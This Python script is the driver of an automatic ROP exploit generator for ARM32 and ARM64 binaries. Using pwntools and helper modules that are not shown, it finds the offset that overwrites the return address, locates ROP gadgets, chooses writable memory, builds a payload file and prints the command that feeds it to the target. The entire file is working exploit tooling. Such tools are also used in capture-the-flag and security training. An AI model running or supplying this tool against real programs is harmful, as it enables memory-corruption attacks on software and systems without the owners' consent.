import argparse
import sys
import os
from pwn import *
from offset_finder import find_offset, find_offset_file
from find_gadgets import locate_gadgets
from writable_memory_finder import analyze_binary
from payload_constructor import construct_payload

def main():
    parser = argparse.ArgumentParser(description="Automatic ROP Exploit Generator")
    parser.add_argument("--binary", required=True, help="Path to the vulnerable binary.")
    parser.add_argument("--arch", choices=['arm32', 'arm64'], required=True, help="Target architecture.")
    parser.add_argument("--input-method", choices=['stdin', 'file'], default='stdin', help="Method of input: 'stdin' or 'file'.")
    parser.add_argument("--input-arg", help="Additional argument if needed for 'file' input method.")
    parser.add_argument("--padding-file", default="padding", help="Name of the padding file.")
    parser.add_argument("--keep-file", action='store_true', help="Keep the padding file after execution.")
    parser.add_argument("--max-length", type=int, default=2048, help="Maximum length of the cyclic pattern.")
    args = parser.parse_args()

    binary_path = args.binary

    if not os.path.exists(binary_path):
        log.error(f"Binary '{binary_path}' does not exist.")
        sys.exit(1)

    # Step 1: Find the offset to overwrite the return address
    log.info("Finding offset to overwrite return address...")
    if args.input_method == 'file':
        print("Finding offset using file input method")
        offset = find_offset_file(
            binary_path=args.binary,
            max_length=args.max_length,
            input_method=args.input_method,
            input_arg=args.input_arg,
            breakpoint_func="main",
            padding_file=args.padding_file,
            keep_file=args.keep_file
        )
    else:
        print("Finding offset using stdin input method")
        offset = find_offset(
            binary_path=binary_path,
            max_length=args.max_length,
            input_method=args.input_method,
            input_arg=args.input_arg if args.input_method == 'file' else None,
            padding_file=args.padding_file,
            keep_file=args.keep_file
        )

    if offset == -1:
        log.error("Failed to find offset. Exiting.")
        sys.exit(1)
    log.success(f"Found offset: {offset}")

    # Step 2: Locate ROP gadgets
    log.info("Locating ROP gadgets...")
    gadgets = locate_gadgets(binary_path)
    print(gadgets)
    if not gadgets:
        log.error("No gadgets found. Exiting.")
        sys.exit(1)
    log.success(f"Found gadgets: {', '.join(gadgets.keys())}")

    # Step 3: Find writeable memory locations
    log.info("Analyzing binary for writable memory...")
    analysis_results = analyze_binary(binary_path)
    writable_sections = analysis_results['writable_sections']
    stack_pointer = analysis_results['stack_pointer']

    writable_addr = None
    if writable_sections:
        writable_addr = writable_sections[0]['start']
        log.success(f"Using writable section {writable_sections[0]['name']} at {hex(writable_addr)}")
    elif stack_pointer:
        writable_addr = stack_pointer
        log.success(f"Using stack pointer at {hex(writable_addr)} as writable memory")
    else:
        log.error("No writable memory found. Exiting.")
        sys.exit(1)

    # Step 4: Construct the payload
    log.info("Constructing payload...")
    payload = construct_payload(offset, gadgets, writable_addr, args.arch)

    if not payload:
        log.error("Failed to construct payload. Exiting.")
        sys.exit(1)

    # Step 5: Save the payload to a file
    payload_file = "payload"
    with open(payload_file, "wb") as f:
        f.write(payload)
    log.success(f"Payload saved to '{payload_file}'")

    print("\n=== Exploit Generation Complete ===")
    print(f"Payload file: {payload_file}")
    print(f"To exploit the binary, run:")
    if args.input_method == 'file':
        print(f"  $ {binary_path} {args.input_arg} {payload_file}")
    else:
        print(f"  $ (cat {payload_file}; cat) | {binary_path}")

if __name__ == "__main__":
    main()
